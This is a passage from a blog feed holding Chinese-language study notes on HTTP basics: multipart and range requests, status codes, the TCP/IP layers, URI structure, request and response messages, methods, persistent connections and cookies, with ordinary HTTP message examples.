multipart&#x2F;form-data; boundary&#x3D;AaB03x</span><br><span class="line"></span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;fieldl&quot;</span><br><span class="line"></span><br><span class="line">Joe Blow</span><br><span class="line">--AaB03x</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;pics&quot;: filename&#x3D;filel. txt&quot;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">(fi1e1.txt的数据)</span><br><span class="line">--AaB03x--</span><br></pre></td></tr></table></figure><ul><li><p>multipart/byteranges</p><p>状态码206（Partial Content，部分内容）</p><p>响应报文包含了多个范围的内容时使用。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Http&#x2F;1.1 206 parTial Content</span><br><span class="line">Date: Fri, 13 Jul 2012 02: 45: 26 GMT</span><br><span class="line">Last-Modified: Fri, 31 Aug 2007 02: 02: 20 GMT</span><br><span class="line">Content-Type: multipart&#x2F;byteranges: boundary&#x3D;THIS_STRING_SEPARATES</span><br><span class="line"></span><br><span class="line">--THIS_STRING_SEPARATES</span><br><span class="line">Content-Type: application&#x2F;pdf</span><br><span class="line">Content-Range: bytes 500-999&#x2F;8000</span><br><span class="line"></span><br><span class="line">...(范围指定的数据)...</span><br><span class="line">--THIS_STRING_SEPARATES</span><br><span class="line">Content-Type: application&#x2F;pdf</span><br><span class="line">Content-Range: bytes 7000-7999&#x2F;8000</span><br><span class="line"></span><br><span class="line">...(范围指定的数据)...</span><br><span class="line">--THIS_STRING_SEPARATES--</span><br></pre></td></tr></table></figure><ul><li><p>在HTTP报文中使用多部分对象集合时，需要在首部字段里加上Content-type；</p></li><li><p>报文主体中包括多个实体,每个实体都由实体头部与实体主体组成</p><p>实体的头部与主体之间依旧使用CR+LF换行.</p></li><li><p>使用boundary字符串来划分多部分对象集合指明的各类实体。在boundary字符串指定的各个实体的起始行之前插入”—“标记作为结束.</p></li><li><p>也可以在某处嵌套使用多部份对象集合</p></li></ul><h3 id="范围请求"><a href="#范围请求" class="headerlink" title="范围请求"></a>范围请求</h3><p>指定范围发送的请求叫做<code>范围请求</code>(Range Request)。执行范围请求时，会用到首部字段<code>Range</code>来指定资源的byte范围。byte范围的指定形式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Range: bytes&#x3D;5001-10000&#x2F;&#x2F;5001~10000字节</span><br><span class="line">Range: bytes&#x3D;5001-&#x2F;&#x2F;从5001字节之后全部的</span><br><span class="line">Range: bytes&#x3D;-3000, 5000-7000&#x2F;&#x2F;从一开始到3000字节和5000~7000字节的多重范围</span><br></pre></td></tr></table></figure><p>针对范围请求，响应会返回状态码为<code>206 Partial Content</code>的响应报文。</p><p>对于多重范围的范围请求，响应会在首部字段<code>Content-Type</code>表明<code>multipart/byteranges</code>后返回响应报文。</p><p>如果服务器端无法响应范围请求，则会返回状态码<code>200 OK</code>和完整的实体内容。</p><h3 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h3><p><code>内容协商</code>(Content Negotiation)机制是指客户端和服务器端就响应的资源内容进行交涉，然后提供给客户端最为适合的资源。内容协商会以响应资源的语言、字符集、编码方式等作为判断的基准。</p><p>包含在请求报文中的某些首部字段就是判断的基准，比如：<code>Accept</code>、<code>Accept-Charset</code>、<code>Accept-Encoding</code>、<code>Accept-Language</code>、<code>Content-Language</code>。</p><p>内容协商技术有以下3种类型：服务器驱动协商(Server-driven Negotiation)、客户端驱动协商(Agent-driven Negotiation)、透明协商(Transparent Negotiation)。</p><hr><h2 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h2><div class="table-container"><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>Informational  (信息性状态码)</td><td>接收的请求正在处理</td></tr><tr><td>2XX</td><td>Success（成功状态码）</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>Redirection（重定向状态码）</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>Client Error（客户端错误状态码）</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>Server Error（服务器错误状态码）</td><td>服务器处理请求出错</td></tr></tbody></table></div><h3 id="2xx-成功"><a href="#2xx-成功" class="headerlink" title="2xx 成功"></a>2xx 成功</h3><blockquote><p>表明请求被正常处理了</p></blockquote><ul><li><p>200(OK) : 正常处理, 该返回啥返回啥</p></li><li><p>204(No Content): 请求处理成功, 但没有资源可返回. 浏览器显示的页面不会更新.</p><p>一般用在只需要从客户端往服务器发送消息,而对客户端不需要发送新消息内容的情况下</p></li><li><p>206(Partial Content): 范围请求,响应报文中包含<code>Content-Range</code>指定范围实体</p></li></ul><h3 id="3xx-重定向"><a href="#3xx-重定向" class="headerlink" title="3xx 重定向"></a>3xx 重定向</h3><blockquote><p>表明浏览器需要执行某些特殊处理以正确处理请求</p></blockquote><ul><li>301(Moved Permanently): 永久性重定向,资源<code>URI</code>改变.</li><li>302(Found): 临时性重定向.希望用户(本次)使用新的<code>URI</code>访问</li><li>303(See Other): 和302来ISI,但是明确表示客户端应当采用GET方法获取资源.</li><li>304(Not Modified): 资源已找到,但未符合条件(不把任何相应主体).虽然是<code>3</code>系列,但和重定向没有关系</li><li>307(Temporary Redirect): 临时重定向.和<code>302</code>类似.</li></ul><h3 id="4xx-客户端错误"><a href="#4xx-客户端错误" class="headerlink" title="4xx 客户端错误"></a>4xx 客户端错误</h3><blockquote><p>表明客户端是发生错误的原因所在</p></blockquote><ul><li>400(Bad Request): 请求报文中存在语法错误.浏览器会像200一样对待此状态码</li><li>401(Unauthorized): 发送的请求需要通过<code>HTTP</code>认证.若之前已进行过一次请求,则表示用户认证失败.(初次会弹出认证用的对话框)</li><li>403(Forbidden): 对请求资源的访问被服务器拒绝了.服务端可以(也可以不)给出 <code>拒绝的详细理由</code></li><li>404(Not Found): 没有找到请求的资源. (也有可能是拒绝但且不想说明理由时使用)</li></ul><h3 id="5xx-服务器错误"><a href="#5xx-服务器错误" class="headerlink" title="5xx 服务器错误"></a>5xx 服务器错误</h3><blockquote><p>表明服务器本身发生错误</p></blockquote><ul><li>500(Internal Server Error): 执行请求时发生错误.可能是<code>Web</code>应用的<code>bug</code>或<code>临时故障</code></li><li>503(Service Unavailable): 服务器暂时处于超负荷或者正在进行停机维护.</li></ul><p>事实上不少返回的<code>状态码</code>是错误的.</p><p>此外, 服务器可以指定自己与客户端的协商状态码.</p><hr><h2 id="HTTP-首部"><a href="#HTTP-首部" class="headerlink" title="HTTP 首部"></a>HTTP 首部</h2><p>待完成</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HTTP 报文的信息 &lt;/p&gt;
&lt;p&gt;HTTP 状态码&lt;/p&gt;
&lt;p&gt;HTTP 首部(待完成)&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="驭龙术" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%A9%AD%E9%BE%99%E6%9C%AF/"/>
    
      <category term="Web开发" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%A9%AD%E9%BE%99%E6%9C%AF/Web%E5%BC%80%E5%8F%91/"/>
    
      <category term="HTTP" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%A9%AD%E9%BE%99%E6%9C%AF/Web%E5%BC%80%E5%8F%91/HTTP/"/>
    
    
      <category term="读书笔记:技术" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E6%8A%80%E6%9C%AF/"/>
    
      <category term="HTTP" scheme="http://yoursite.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>初窥HTTP之一_HTTP基础</title>
    <link href="http://yoursite.com/2020/08/01/%E5%88%9D%E7%AA%A5HTTP%E4%B9%8B%E4%B8%80_HTTP%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2020/08/01/%E5%88%9D%E7%AA%A5HTTP%E4%B9%8B%E4%B8%80_HTTP%E5%9F%BA%E7%A1%80/</id>
    <published>2020-08-01T08:06:08.000Z</published>
    <updated>2020-08-03T00:55:32.044Z</updated>
    
    <content type="html"><![CDATA[<ol><li>TCP/IP 基础</li><li>HTTP简介</li></ol><a id="more"></a><h2 id="TCP-IP-基础"><a href="#TCP-IP-基础" class="headerlink" title="TCP/IP 基础"></a>TCP/IP 基础</h2><p>字面上看, TCP/IP包括了TCP与IP这两大协议．但一般意义上认为TCP/IP是指得以TCP,IP为核心协议的一系列协议族<del>(ko no IPS da!)</del>, 这个协议族是整个互联网运作的基础. HTTP协议是包含在TCP/IP协议族的一个子集.</p><blockquote><p>互联网协议套件（英语：Internet Protocol Suite，缩写IPS）是一个网络通讯模型，以及一整个网络传输协议家族，为网际网络的基础通讯架构。它常被通称为TCP/IP协议族（英语：TCP/IP Protocol Suite，或TCP/IP Protocols），简称TCP/IP 。因为该协定家族的两个核心协定：TCP（传输控制协议）和IP（网际协议），为该家族中最早通过的标准。</p><p>协议还包括: ARP，IP，ICMP，UDP，TCP，DNS，HTTP，FTP , SMTP，POP3，SNMP，ECHO，DHCP，SSH，NNTP 等.</p><p>From: <a href="https://zh.wikipedia.org/wiki/TCP/IP%E5%8D%8F%E8%AE%AE%E6%97%8F" target="_blank" rel="noopener">wiki: TCP/IP协议族</a></p></blockquote><p>本段将简单介绍:</p><ol><li>TCP/IP 的分层管理</li><li>通信传输流,</li><li>IP: 传输</li><li>TCP:可靠性</li><li>DNS: 域名解析</li><li>URI : 资源定位</li></ol><p>以及他们与HTTP是怎么互相协作的.本段不涉及具体的HTTP内容.</p><h3 id="TCP-IP的分层管理"><a href="#TCP-IP的分层管理" class="headerlink" title="TCP/IP的分层管理"></a>TCP/IP的分层管理</h3><p>假设你已经知道了 <a href="https://zh.wikipedia.org/zh-cn/OSI%E6%A8%A1%E5%9E%8B" target="_blank" rel="noopener">OSI模型</a> 将信息传输分为七层, 他们依次是</p><ol><li>第7层 应用层</li><li>第6层 表达层</li><li>第5层 会话层</li><li>第4层 传输层</li><li>第3层 网络层</li><li>第2层 数据链路层</li><li>第1层 物理层</li></ol><p>TCP/IP协议簇(再次提醒并不是TCP与IP这两个协议) 将其简化成了四个层次:</p><ol><li><p>应用层, 对应OSI模型中的7~5层</p><blockquote><p>该层包括所有和应用程序协同工作，利用基础网络交换应用程序专用的数据的协议。数据从网络相关的程序以这种应用内部使用的格式进行传送，然后被编码成标准协议的格式。</p><p>包括<strong>HTTP</strong>（万维网服务）、<strong>FTP</strong>（文件传输）、<strong>SMTP</strong>（电子邮件）、<strong>SSH</strong>（安全远程登录）、<strong>DNS</strong>（名称&lt;-&gt; IP地址寻找）以及许多其他协议</p></blockquote></li><li><p>传输层, 对应OSI模型中的第4层</p><blockquote><p>解决诸如端到端可靠性（“数据是否已经到达目的地？”）和保证数据按照正确的顺序到达这样的问题。在TCP/IP协议组中，传输协议也包括所给数据应该送给哪个应用程序。</p><p>包括 TCP与UDP 协议等</p><blockquote><p>TCP : 是一个“可靠的”、面向链接, 基于字节流的传输机制</p><p>UDP: 是一个无链接的数据报协议。它是一个“尽力传递”（best effort）的协议, 因为它不检查数据包是否已经到达目的地，并且不保证它们按顺序到达。<del>但是快</del></p></blockquote></blockquote></li><li><p>网络互连层, 对应OSI模型中的第3层</p><blockquote><p>解决在网络上流动的数据包. 解决如何选取网络中的路径将数据从源网络传输到目的网络.</p><p>例如IP协议</p></blockquote></li><li><p>网络链路层, 对应OSI模型中的第1~2层</p><blockquote><p>用来处理连接网络的硬件部分, 包括控制操作系统, 硬件设备驱动, NIC(网络适配器, 即网卡) , 以及光纤等物理部分</p></blockquote></li></ol><h3 id="通信传输流"><a href="#通信传输流" class="headerlink" title="通信传输流"></a>通信传输流</h3><ol><li>首先作为发送端的客户端在应用层利用（http）发出一个想看某个Web页面的HTTP请求。</li><li>为了传输方便，在传输层把(TCP)从应用层传下来的数据进行分割，并在各个报文上打上标记序号及端口号发给网络层</li><li>在网络层(IP)，给数据加上作为通信目的地址的MAC地址后发给链路层。到此发送网络的通信请求就准备齐全了</li><li>接收端的服务器在链路层接收到数据，按序往上层发送，直到应用层。才算是真正接收到从客户端发送过来的HTTP请求</li></ol><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/%E9%80%9A%E4%BF%A1%E4%BC%A0%E8%BE%93%E6%B5%81.png" alt=""></p><p>发送端在层与层之间传输数据时，每经过一层必定会被打伤一个该层所属的首部信息。反之，接收端则会一层一层的去掉</p><h3 id="IP-传输"><a href="#IP-传输" class="headerlink" title="IP : 传输"></a>IP : 传输</h3><p><em><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">wiki链接</a></em></p><p>网际协议（英语：Internet Protocol，缩写：IP；也称互联网协议）是用于分组交换数据网络的一种协议。</p><blockquote><p>IP是在TCP/IP协议族中网络层的主要协议，任务仅仅是根据源主机和目的主机的地址来传送数据。为此目的，IP定义了寻址方法和数据报的封装结构。第一个架构的主要版本为IPv4，目前仍然是广泛使用的互联网协议，尽管世界各地正在积极部署IPv6。</p></blockquote><p>要保证数据能够传输需要两个重要条件: IP地址与MAC地址.</p><p>MAC地址是烧录在网卡或者接口上的<strong>物理地址</strong>，具有二层意义和<strong>全球唯一性</strong>，一般不能被改变。IP地址是网络中的主机或者三层接口在网络中的<strong>逻辑地址</strong>，在<strong>同一个网络内具有唯一性</strong>。</p><p>IP地址通过ARP协议与MAC对应, IP地址是可变换的, MAC 地址是不变的.MAC 地址是杂乱无序的, 如果只是用MAC地址尽管可以传输但是造成浪费.(要从整个互联网中找到你这个MAC地址) , 使用IP地址则可以找到你所处的网络, 在从该网络设备转交给你. </p><p><a href="https://www.zhihu.com/question/49335649/answer/120746792" target="_blank" rel="noopener"><em>IP地址和 MAC地址的区别和联系是什么?</em></a></p><h3 id="TCP-可靠性"><a href="#TCP-可靠性" class="headerlink" title="TCP : 可靠性"></a>TCP : 可靠性</h3><p><a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener"><em>wiki链接</em></a></p><p>TCP提供了可靠的字节流服务. 字节流是指将大块数据分割更小块的<strong>报文段 </strong>(segment) 为单位进行传输. 并且能够将数据准确地传给对方, 并且确认数据的送达.</p><p>为了保证数据可靠地送达, TCP 使用了<strong>三次握手</strong>.其中使用了 TCP 的标志（flag): SYN（synchronize） 和 ACK(acknowledgement)</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/%E4%B8%89%E6%AC%A1%E6%8C%A5%E6%89%8B.png" alt=""></p><h3 id="DNS-域名解析"><a href="#DNS-域名解析" class="headerlink" title="DNS : 域名解析"></a>DNS : 域名解析</h3><p><a href="https://zh.wikipedia.org/wiki/Domain_Name_System" target="_blank" rel="noopener"><em>Wiki链接</em></a></p><p><strong>DNS</strong>（Domain Name System）服务是和HTTP协议一样位于应用层的协议。它提供域名到IP地址之间的解析服务，或逆向从IP地址反查域名的服务。</p><p>用户输入一个网址, 客户机首先向DNS请求IP地址, 获得后由HTTP协议生成针对目标服务器的 <em>请求报文</em> . TCP 将 请求报文分割成多个报文段并负责传输的可靠性. IP协议将这些报文段传送至指定的目标服务器. </p><p>服务器收到这些报文段后由TCP协议将报文段还原成HTTP的请求报文并检查完整性（如果出错再引起另外的处理), HTTP协议对请求报文进行处理, 并返回响应报文, 后续过程类似. </p><h3 id="URI-资源定位"><a href="#URI-资源定位" class="headerlink" title="URI : 资源定位"></a>URI : 资源定位</h3><p>统一资源标识符（英语：Uniform Resource Identifier，缩写：URI）在电脑术语中是一个用于标识某一互联网资源名称的字符串。</p><p>注意 : URI 是用字符串标识的某一互联网资源, 而URL是资源在互联网上的地址, URL是URI的子集.</p><p>通用URI的格式如下：</p><blockquote><p>[协议名]://用户名:密码@主机名:端口/路径?查询参数#片段ID</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                    hierarchical part</span><br><span class="line">        ┌───────────────────┴─────────────────────┐</span><br><span class="line">                    authority               </span><br><span class="line">        ┌───────────────┴───────────────┐</span><br><span class="line">  abc:&#x2F;&#x2F;username:password@example.com:123&#x2F;path&#x2F;data?key&#x3D;value&amp;key2&#x3D;value2#fragid1</span><br><span class="line">  └┬┘   └───────┬───────┘ └────┬────┘ └┬┘ └───┬───┘ └─────────┬─────────┘ └──┬──┘</span><br><span class="line">scheme  user information     host     port  path            query         fragment</span><br><span class="line"> 协议   用户的登录信息  服务器地址  端口  路径    查询参数  片段ID</span><br><span class="line">  urn:example:mammal:monotreme:echidna</span><br><span class="line">  └┬┘ └──────────────┬───────────────┘</span><br><span class="line">scheme              path</span><br></pre></td></tr></table></figure><ul><li><p><strong>协议方案</strong></p><p>使用<code>http:</code> 或<code>https：</code>等协议方案名获取访问资源时要指定协议类型。不区分字母大小写，最后附一个冒号<code>：</code> . 也可使用<code>data：</code>或 <code>javascript：</code>这类指定数据或脚本程序的方案名。</p></li><li><p><strong>登录信息（认证）</strong></p></li></ul><p>​    指定用户名和密码作为从服务器端获取资源时必要的登录信息（身份认证）。此项是可选项。</p><ul><li><strong>服务器地址</strong></li></ul><p>​    使用绝对URI必须指定待访问的服务器地址。地址可以是类似hackr.jp这种DNS可解析的名称，或是192.168.1.1这类IPv4地址名，还可以是[0:0:0:0:0:0:0:1]这样用方括号括起来的Pv6地址名。</p><ul><li><strong>服务器端口</strong></li></ul><p>​    指定服务器连接的网络端口号。此项也是可选项，若用户省略则自动使用默认端口号。带层次的文件路径。指定服务器上的文件路径来定位特指的资源。这与UNIX系统的文件目录结构相似。</p><ul><li><strong>带层次的文件路径</strong></li></ul><p>​    指定服务器上的文件路径来定位特指的资源。这与UNIX系统的文件目录结构相似。</p><ul><li><strong>查询字符串</strong></li></ul><p>​    针对已指定的文件路径内的资源，可以使用查询字符串传入任意参数。此项可选。</p><ul><li><p><strong>片段标识符</strong></p><p>使用片段标识符通常可标记出已获取资源中的子资源（文档内的某个位置）。但在RFC中并没有明确规定其使用方法。该项也为可选项。</p></li></ul><hr><h2 id="HTTP简介"><a href="#HTTP简介" class="headerlink" title="HTTP简介"></a>HTTP简介</h2><p>本段将非常粗略地一览HTTP基本情况, 包括以下内容:</p><ol><li>HTTP基本情况</li><li>HTTP报文</li><li>HTTP方法与命令</li><li>持久连接</li><li>Cookie : 状态管理</li></ol><h3 id="HTTP基本情况"><a href="#HTTP基本情况" class="headerlink" title="HTTP基本情况"></a>HTTP基本情况</h3><p>HTTP协议用于客户端与服务端之间的通信. 客户端向服务端发出一个访问资源的<strong>请求</strong>, 服务端针对这个请求做出 <strong>响应</strong>. 服务端无法主动地向客户端建立通信.(除非附加了其他协议). 请求与响应都是通过HTTP报文来传送数据的.</p><p>计算机扮演客户端与服务端的角色可能会切换, 但对于每条通信线路二者的角色是确定的.</p><p>HTTP是<strong>无状态协议</strong>, HTTP协议自身对先前的通信状态不进行保存, 不进行持久化处理.这是为了快递处理大量事物,保证协议的可伸缩性.为了实现通信状态的保持状态, 引入了Cookie来实现持久化通信.</p><p>HTTP使用URI进行资源的定位, 指定URI的方式有很多:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 完整的请求URI</span><br><span class="line">GET http:&#x2F;&#x2F;www.baidu.com&#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">2. 使用相对URI地址</span><br><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">HOST: baidu.com</span><br></pre></td></tr></table></figure><p>除此之外, 如果对于服务器本身(而不是访问资源)的请求, 可以只用<code>*</code>来代替请求URI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS * HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure><h3 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h3><p>如前所述, HTTP是通过<strong>请求报文</strong>与<strong>响应报文</strong>进行信息传递的. </p><h4 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1</span><br><span class="line">HOST: baidu.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 5000</span><br><span class="line">If-Modified-Since: Thu. 12 Jul 2020 07: 30: 00 GMT</span><br><span class="line"></span><br><span class="line">name&#x3D;ueno&amp;age&#x3D;37</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>起始处的<code>GET</code> 表示向服务器请求的访问类型, 被称为 <strong>方法</strong>. 而后的字符串<code>/index.html</code> 是使用URI表示的请求访问的资源对象, 被称为 <strong>请求URI</strong>.  <code>HTTP/1.1</code> 是用于表明客户端使用的协议 的 <strong>协议版本号</strong>.</p><p>以上三个参数组成了请求报文的 <strong>请求行.</strong></p><p>后面的几行被称之为 <strong>请求首部字段</strong> (示例中2-6行), 存储了对请求的进一步要求. 最后接上 <strong>内容实体</strong> 的主体.(示例中8行及以后)</p><h4 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Http&#x2F;1.1 200 Ok</span><br><span class="line">Date: Thu. 12 Jul 2020 07: 30: 00 GMT</span><br><span class="line">Content-type:message&#x2F;http</span><br><span class="line">Content-Length: 1024</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>首行依次是 <strong>协议版本号</strong>, <strong>状态码</strong>, <strong>状态码的原因短语</strong>, 这一行被称作 <strong>状态行.</strong></p><p>后面几行被称为 <strong>响应首部字段</strong>, 最后被称为 <strong>资源实体</strong>的主体.</p><h3 id="HTTP方法与命令"><a href="#HTTP方法与命令" class="headerlink" title="HTTP方法与命令"></a>HTTP方法与命令</h3><p>下面介绍一些HTTP/1.1中的方法.</p><ul><li><p>GET：获取资源<br>GET方法用来请求访问已被URI识别的资源。指定的资源经服务器端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回；如果是像CGl（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。<br><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/GET.png" alt=""></p></li><li><p>POST：传输实体主体<br>POST方法用来传输实体的主体。虽然用GET方法也可以传输实体的主体，但一般不用GET方法进行传输，而是用POST方法。虽说POST的功能与GET很相似，但POST的主要目的并不是获取响应的主体内容。</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/POST.png" alt=""></p></li><li><p>PUT：传输文件<br>PUT方法用来传输文件。就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。但是，鉴于HTTP/1.1的PUT方法自身不带验证机制，任何人都可以上传文件，存在安全性问题，因此一般的Web网站不使用该方法。若配合Web应用程序的验证机制，或架构设计采用REST （REpresentational State Transfer，表征状态转移）标准的同类Web网站，就可能会开放使用PUT方法。</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/PUT.png" alt=""></p></li><li><p>HEAD：获得报文首部<br>HEAD方法和GET方法一样，只是不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等。 </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/HEAD.png" alt=""></p></li><li><p>DELETE：删除文件<br>DELETE方法用来删除文件，是与PUT相反的方法。DELETE方法按请求URI删除指定的资源。但是，HTTP/1.1的DELETE方法本身和PUT方法一样不带验证机制，所以一般的Web网站也不使用DELETE方法。当配合Web应用程序的验证机制，或遵守REST标准时还是有可能会开放使用的。</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/DELETE.png" alt=""></p></li><li><p>OPTIONS：询问支持的方法<br>OPTIONS方法用来查询针对请求URI指定的资源支持的方法</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/OPTIONS.png" alt=""></p></li><li><p>TRACE：追踪路径<br>TRACE方法是让Web服务器端将之前的请求通信环回给客户端的方法。发送请求时，在Max-Forwards首部字段中填入数值，每经过一个服务器端就将该数字减1，当数值刚好减到0时，就停止继续传输，最后接收到请求的服务器端则返回状态码200OK的响应。</p><p>客户端通过TRACE方法可以查询发送出去的请求是怎样被加工修改/篡改的。这是因为，请求想要连接到源目标服务器可能会通过代理中转，TRACE方法就是用来确认连接过程中发生的一系列操作。但是，TRACE方法本来就不怎么常用，再加上它容易引发XST(Cross-Site Tracing，跨站追踪）攻击，通常就更不会用到了。 </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/TRACE.png" alt=""></p></li><li><p>CONNECT：要求用隧道协议连接代理<br>CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL（Secure Sockets Layer，安全套接层）和TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/CONNECT.png" alt=""></p></li></ul><p>方法的名称区分大小写, 注意使用大写字母.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202008/01/ALL.png" alt=""></p><h3 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h3><p>在最开始我们讲到通信建立前TCP协议需要进行三次握手, 此外在结束后还要进行四次挥手. 在HTTP协议的最初版本, 每进行一次通信就要重复执行上述步骤, 导致了大量资源的浪费. (例如一个网页中的多张图片均需要进行请求). 因此在/1.1版本中加入了<a href="https://zh.wikipedia.org/zh-hans/HTTP%E6%8C%81%E4%B9%85%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener"> <strong>持久连接</strong> </a>的方法. 只要任意端没有主动断开连接, 则持续保持TCP的连接状态. </p><p>在 HTTP 1.1 中 所有的连接默认都是持续连接，除非特殊声明不支持。</p><h4 id="管线化"><a href="#管线化" class="headerlink" title="管线化"></a>管线化</h4><p><a href="https://zh.wikipedia.org/zh-cn/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96" target="_blank" rel="noopener">HTTP管线化</a>（英语：HTTP pipelining）是将多个HTTP请求（request）整批提交的技术，而在发送过程中不需先等待服务器的回应。这是基于持久连接完成的.</p><h3 id="Cookie-状态管理"><a href="#Cookie-状态管理" class="headerlink" title="Cookie : 状态管理"></a>Cookie : 状态管理</h3><p>为了保留无状态协议的轻便性又解决状态保存的问题引入了Cookie技术. 通过在请求与响应报文中写入Cookie信息来控制客户端的状态.</p><p>Cookie 会根据从服务器端发送的响应报文内的一个叫做 <strong>Set-Cookie</strong> 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie值后发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;请求报文1</span><br><span class="line">GET &#x2F;reader&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: hackr.jp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;响应报文</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Thu, 12 Jul 2012 07:12:20 GMT</span><br><span class="line">Server: 